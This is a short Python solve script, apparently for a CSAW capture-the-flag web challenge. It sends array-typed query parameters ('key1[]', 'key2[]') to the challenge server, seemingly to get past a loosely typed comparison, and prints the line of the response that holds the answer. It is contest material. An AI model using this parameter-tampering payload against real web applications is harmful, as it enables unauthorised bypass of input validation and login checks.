import requests

payload = {'key1[]': '', 'key2[]': 'a'}
r = requests.get("http://web.chal.csaw.io:1000", params=payload)
print(r.text.split("\n")[-2])
